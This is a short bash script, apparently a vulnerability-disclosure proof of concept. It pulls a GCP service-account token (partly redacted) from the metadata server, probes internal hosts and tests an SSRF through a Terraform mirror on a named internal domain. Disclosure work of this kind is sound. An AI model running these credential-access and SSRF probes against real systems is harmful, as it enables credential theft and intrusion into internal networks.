#!/usr/bin/env bash
set -e

echo "=== FINDING 1: GCP Metadata access ==="
echo "SA identity:"
curl -sf "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email" \
  -H "Metadata-Flavor: Google"
echo ""

echo "SA scopes:"
curl -sf "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes" \
  -H "Metadata-Flavor: Google"
echo ""

echo "SA token (prefix only — proves credential access):"
curl -sf "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  -H "Metadata-Flavor: Google" \
  | python3 -c "
import sys, json
t = json.load(sys.stdin)
print('token_type:', t['token_type'])
print('expires_in:', t['expires_in'])
print('access_token[:20]:', t['access_token'][:20] + '...[REDACTED]')
"

echo ""
echo "=== FINDING 2: Internal network reachability ==="
echo "API server (10.30.0.120):"
curl -sf "http://10.30.0.120/api/iacp/v3/accounts" \
  -o /dev/null -w "HTTP %{http_code}\n" || echo "connection failed"

echo "Blob server (10.30.0.102):"
curl -sf "http://10.30.0.102/" \
  -o /dev/null -w "HTTP %{http_code}\n" || echo "connection failed"

echo "Relay server (10.30.0.104):"
curl -sf "http://10.30.0.104/" \
  -o /dev/null -w "HTTP %{http_code}\n" || echo "connection failed"

echo ""
echo "=== FINDING 3: C4 mirror SSRF (origin = API server, not agent) ==="
curl -si "http://internal.main.scalr.dev/terraform-mirror/https://httpbin.org/status/200" \
  --max-time 8 --no-location \
  | grep -E "^HTTP/|^Location:"

echo ""
echo "=== done ==="